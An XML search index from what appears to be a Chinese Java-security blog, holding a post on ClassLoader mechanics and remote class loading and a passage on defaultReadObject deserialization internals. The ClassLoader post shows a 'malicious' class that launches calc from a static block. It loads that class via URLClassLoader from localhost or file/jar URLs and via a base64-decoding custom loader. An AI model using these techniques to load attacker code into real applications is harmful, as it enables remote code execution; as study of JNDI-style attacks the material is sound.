<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ClassLoader动态类加载</title>
    <url>/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<p>在JNDI、RMI等攻击中，我们常会用到这么一段测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exec</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将它反编译成class文件后，开启监听服务即可进行远程类加载，但这段代码中没有main等执行方法，它又为啥会执行呢？这其实跟类加载机制有关</p>
<h1 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h1><p>类的加载分为以下几步：</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230927210744873.png" alt="image-20230927210744873"></p>
<p>类加载初始化和实例化的时候会执行对应的代码块</p>
<ul>
<li>初始化：静态代码块(一次执行中静态代码块只能执行一次)</li>
<li>实例化：匿名代码块、构造方法</li>
</ul>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h2><p>以Person类为例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticAction</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;匿名代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>类进行实例化</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;S1nJa&quot;</span>,<span class="number">2</span>);</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br><span class="line">匿名代码块</span><br><span class="line">有参构造方法</span><br></pre></td></tr></table></figure>

<p><strong>调用静态方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">    Person.staticAction();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br><span class="line">静态方法</span><br></pre></td></tr></table></figure>

<p><strong>class类加载</strong></p>
<p>用class关键字时，只进行了类加载并没有进行初始化，所以不会调用任何代码块</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Person.class;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Class.forName</strong></p>
<p><code>Class.forName()</code>默认会调用forName0，而第二个参数默认为true，所以会进行初始化</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230927213440184.png" alt="image-20230927213440184"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;	</span><br><span class="line">    Class.forName(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br></pre></td></tr></table></figure>

<p>若想不进行初始化则可以调用它的其他构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;      </span><br><span class="line">       <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">       Class.forName(<span class="string">&quot;Person&quot;</span>,<span class="literal">false</span>,cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>loadClass</strong></p>
<p>默认不进行初始化，需要结合<code>newInstance()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> cl.loadClass(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">c.newInstance();</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br><span class="line">匿名代码块</span><br><span class="line">无参构造方法</span><br></pre></td></tr></table></figure>

<p>JNDI注入等，都是通过lookup中调用<code>newInstance()</code>实现的，所以会实例化class文件中的恶意类，调用对应的恶意代码块。而这些类的初始化、实例化都是由类加载器完成的，所以看下类加载器。</p>
<h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><p>类加载器主要分为两类：</p>
<ul>
<li><strong>JVM 默认类加载器</strong><br>主要由 “引导类加载器”、“扩展类加载器”、“系统类加载器” 三方面组成。</li>
<li><strong>用户自定义类加载器</strong><br>用户可以编写继承 java.lang.ClassLoader类的自定义类来自定义类加载器。</li>
</ul>
<h2 id="引导类加载器（BootstrapClassLoader）"><a href="#引导类加载器（BootstrapClassLoader）" class="headerlink" title="引导类加载器（BootstrapClassLoader）"></a>引导类加载器（BootstrapClassLoader）</h2><p>底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载&#x2F;jre&#x2F;lib&#x2F;rt.jar包下的内容</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928105919516.png" alt="image-20230928105919516"></p>
<p>随便找了个&#x2F;jre&#x2F;lib&#x2F;rt.jar包下的类Applet，查看它的父类加载器，由于他是被BootstrapClassLoader加载的，所以并没有父类加载器，结果为null。</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928110137322.png" alt="image-20230928110137322"></p>
<h2 id="扩展类加载器-ExtensionsClassLoader"><a href="#扩展类加载器-ExtensionsClassLoader" class="headerlink" title="扩展类加载器(ExtensionsClassLoader)"></a>扩展类加载器(ExtensionsClassLoader)</h2><p>主要负责加载&#x2F;jre&#x2F;lib&#x2F;ext或者java.ext.dirs中指明目录对的java扩展库</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928110520142.png" alt="image-20230928110520142"></p>
<p>该类位于<code>sun.misc.Launcher$ExtClassLoader</code></p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928110843548.png" alt="image-20230928110843548"></p>
<h2 id="系统类加载器（AppClassLoader）"><a href="#系统类加载器（AppClassLoader）" class="headerlink" title="系统类加载器（AppClassLoader）"></a>系统类加载器（AppClassLoader）</h2><p>主要负责加载用户类路径(classPath)上的类库，如果我们没有实现自定义的类加载器那它就是我们程序中的默认加载器。</p>
<p>ClassLoaderTest本身就是由它来加载的，该类位于<code>sun.misc.Launcher$AppClassLoader</code></p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928111357642.png" alt="image-20230928111357642"></p>
<h2 id="自定义类加载器-CustomClassLoader"><a href="#自定义类加载器-CustomClassLoader" class="headerlink" title="自定义类加载器(CustomClassLoader)"></a>自定义类加载器(CustomClassLoader)</h2><p>可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器</p>
<h1 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h1><p>一般来说，当需要加载一个类时，JVM的三种默认类加载器是按按需加载的方式相互配合使用，这就衍生出了双亲委派模式</p>
<img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928124921659.png" alt="image-20230928124921659" style="zoom: 80%;">

<p>双亲委派的意思是：当类加载器需要加载一个类时，首先它会把这个类请求委派给父类加载器去完成 (如AppClassLoader会委派给ExtClassLoader，ExtClassLoader会委派给BootStrapClassLoader)。一直递归到顶层，当父加载器无法完成这个请求时，子类才会尝试去加载。这里的双亲其实只是翻译问题，他们之间并不存在继承关系，只是逻辑上的指向。</p>
<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ol>
<li>避免重复加载：双亲委派模型使得每个类加载器首先向上委派给父类加载器，因此在整个类加载器层次结构中，任何类都只会被加载一次。这避免了同一个类被多个不同的类加载器重复加载，减少了内存占用和冲突问题。</li>
<li>确保类的安全性：由于父类加载器在子类加载器之前尝试加载类，可以保证系统核心库类的安全性。例如，JDK 中的核心类库（如java.lang.String）由BootstrapClassLoader负责加载，因此无法通过自定义的类加载器来替换或修改这些核心类的行为，防止恶意代码对核心类进行篡改。</li>
</ol>
<p>例如在创建个Java.lang包，自定义一个StringTest类，在执行StringTest.class时进行了类加载，而这里违背了双亲委派，所以系统不允许加载运行</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928130251252.png" alt="image-20230928130251252"></p>
<h1 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h1><p>前边用loadClass或forName进行了类加载，但例如加载的Person类都是在程序中写好的，若要进行利用就要考虑能否进行任意类加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#loadClass</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> cl.loadClass(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">#forName</span><br><span class="line">Class.forName(<span class="string">&quot;Person&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>先看下底层原理，主要用到以下几个方法：</p>
<ul>
<li>loadClass(加载指定的Java类)</li>
<li>findLoadedClass(查找JVM已经加载过的类)</li>
<li>findClass(查找指定的Java类)</li>
<li>defineClass(将字节码转换为class对象)</li>
<li>resolveClass(链接指定的Java类)</li>
</ul>
<h2 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h2><p>调用findLoadedClass()查找是否加载过该类，这里没加载所以c&#x3D;null，进入if这里就是双亲委派的过程</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928134106176.png" alt="image-20230928134106176"></p>
<p>先判断是否有父类加载器，如果有则调用父类加载器的loadClass进行加载，这里进入ExtClassLoader的loadClass</p>
<p>由于ExtClassLoader中没有loadClass(),所以还是调用到了他的父类ClassLoader的loadClass()，逻辑仍然是判断是有存在父类加载器，由于BootstrapClassLoader是用C写的，所以这里parent为null，通过else里的findBootstrapClassOrNull寻找</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928134451767.png" alt="image-20230928134451767"></p>
<p>Person类并不在rt.jar包中，所以肯定也没有，接着到下边的findClass(),当前调用的是ExtClassLoader的findClass()，person类也不是扩展类所以自然也不会有</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928134921407.png" alt="image-20230928134921407"></p>
<p>回到AppClassLoader的loadClass()，进入URLClassLoader.findClass()方法</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928135420529.png" alt="image-20230928135420529"></p>
<p>接着调用到了他的父类SecureClassLoader的defineClass()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name,</span><br><span class="line">                                     <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                     CodeSource cs)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(name, b, off, len, getProtectionDomain(cs));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后又回到了ClassLoader的defineClass()，</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928140942156.png" alt="image-20230928140942156"></p>
<p>里边调用defineClass1，进行了类加载，defineClass1使用C实现的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass1(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                     ProtectionDomain pd, String source);</span><br></pre></td></tr></table></figure>

<h2 id="foreName"><a href="#foreName" class="headerlink" title="foreName"></a>foreName</h2><p>在调试forName()时发现，它的底层也是调用loadClass()实现的</p>
<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928141353838.png" alt="image-20230928141353838"></p>
<p>那它为啥会进行初始化呢？主要是在C中通过对initialize的判断，进行初始化设置，可参考：<a href="https://zhuanlan.zhihu.com/p/205324628">https://zhuanlan.zhihu.com/p/205324628</a></p>
<h1 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h1><p>loadClass的调用过程主要涉及到ClassLoader和它的几个子类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader—&gt;SecureClassLoader—&gt;URLClassLoader—&gt;AppClassLoader</span><br></pre></td></tr></table></figure>

<p>类的加载就在于findClass()的defineClass()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">loadClass—&gt;findClass—&gt;defineClass</span><br></pre></td></tr></table></figure>

<p>其中URLClassLoader，可以加载URL中的类请求，那既然这样如果参数可控我们便可以进行任意类加载</p>
<p>先构造恶意类，将其编译成class文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exec</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ClassLoaderTest</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:7777/&quot;</span>)&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">exec</span> <span class="operator">=</span> cl.loadClass(<span class="string">&quot;Exec&quot;</span>);</span><br><span class="line">        exec.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928143257237.png" alt="image-20230928143257237"></p>
<p>除此外也可以用file协议或者jar协议</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;jar:file:///D:\\java\\Security\\Exec.jar!\\&quot;</span>)&#125;);</span><br><span class="line"><span class="type">Class</span> <span class="variable">exec</span> <span class="operator">=</span> cl.loadClass(<span class="string">&quot;Exec&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">URLClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///D:\\java\\Security\\&quot;</span>)&#125;);</span><br><span class="line"><span class="type">Class</span> <span class="variable">exec</span> <span class="operator">=</span> cl.loadClass(<span class="string">&quot;Exec&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h1><p>自定义类加载器步骤：</p>
<p>1、继承ClassLoader类</p>
<p>2、覆盖findClass()方法</p>
<p>3、在findClass()方法中调用defineClass()方法</p>
<p>假设将Exec.class文件进行base64加密，加密后使用java自带的classLoader就不能进行初始化了，那就可以使用自定义的ClassLoader进行加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String classPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomClassLoader</span><span class="params">(String classPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classPath = classPath;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] readFile(String path) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(path));</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(bytes);</span><br><span class="line">        <span class="keyword">return</span> decode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fullPath</span> <span class="operator">=</span> classPath+File.separator+name+<span class="string">&quot;.class&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] bytes = readFile(fullPath);</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,bytes,<span class="number">0</span>,bytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用readFile方法读取文件，并进行base64解密，之后调用defineClass进行加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">CustomClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomClassLoader</span>(<span class="string">&quot;D:\\java\\Security&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; c = cl.loadClass(<span class="string">&quot;Exec&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/17/ClassLoader%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/image-20230928163349076.png" alt="image-20230928163349076"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>defaultReadObject分析</title>
    <url>/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>起因是想重新了解下反序列化，在看HashMap的readObject时，看到了defaultReadObject()，想到在重写readOject()中基本都遇到过，于是想了解下这个函数的具体作用以及实现原理。</p>
<h1 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h1><p>先看下执行原生readOject()都发生了什么</p>
<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Animals</span> <span class="variable">animals</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animals</span>(<span class="string">&quot;111&quot;</span>, <span class="string">&quot;222&quot;</span>, <span class="string">&quot;333&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(animals);</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        <span class="type">Animals</span> <span class="variable">o</span> <span class="operator">=</span> (Animals)ois.readObject();</span><br><span class="line">        System.out.println(o.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Animals</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animals</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String dog;</span><br><span class="line">    <span class="keyword">public</span> String cat;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> String pet;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animals</span><span class="params">(String dog, String cat, String pet)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dog = dog;</span><br><span class="line">        <span class="built_in">this</span>.cat = cat;</span><br><span class="line">        <span class="built_in">this</span>.pet = pet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Animals&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;dog=&#x27;&quot;</span> + dog + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, cat=&#x27;&quot;</span> + cat + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, pet=&#x27;&quot;</span> + pet + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>在执行<code>readOject()</code>后会执行<code>readOject0</code>，上半部分主要是快数据模式的判断，详细点说就是：在序列化和反序列化时，会采用块模式进行存储提高效率</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910223737867.png" alt="image-20230910223737867"></p>
<p>而这里就是判断是否为该模式，是的话则检查当前块中是否还有剩余的数据，如果有的话则说明(有剩余未处理的数据),会抛出异常；如若没问题，最后就是将该模式设为false关闭掉。</p>
<p>这个块数据模式的设置就在<code>ObjectInputStream</code>，其中<code>bin</code>的值就是该模式下的序列化数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    bin = <span class="keyword">new</span> <span class="title class_">BlockDataInputStream</span>(in);</span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>);</span><br><span class="line">    vlist = <span class="keyword">new</span> <span class="title class_">ValidationList</span>();</span><br><span class="line">    enableOverride = <span class="literal">false</span>;</span><br><span class="line">    readStreamHeader();</span><br><span class="line">    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后<code>tc = bin.peekByte()) == TC_RESET</code> 进行读取一个字节的数据来进行判断，经过一级级调用最后到了<code>read()</code>此时pos为4，</p>
<blockquote>
<p>peekByte方法，不是读取当前的字节，而是后一个字节。但是readByte方法则是读取当前所在的字节，不是后一个。这两个方法还是不一样的！</p>
</blockquote>
<p>所以取出的数据即：115赋值给tc（前边的-84，-19，0，5是序列化数据开头的标识信息）</p>
<p><img src="/2023/09/11/defaultReadObject%E5%88%86%E6%9E%90/image-20230910224632288.png" alt="image-20230910224632288"></p>
<p>switch语句找到对应115的case语句，处理对象数据，跟进下readOrdinaryObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br></pre></td></tr></table></figure>

<p>首先判断读取一个字节数据进行判断(刚有提到readByte是读取当前字节，所以及时pos刚才自增了单读出来的还是115)，接着到了readClassDesc()读取类描述符。</p>
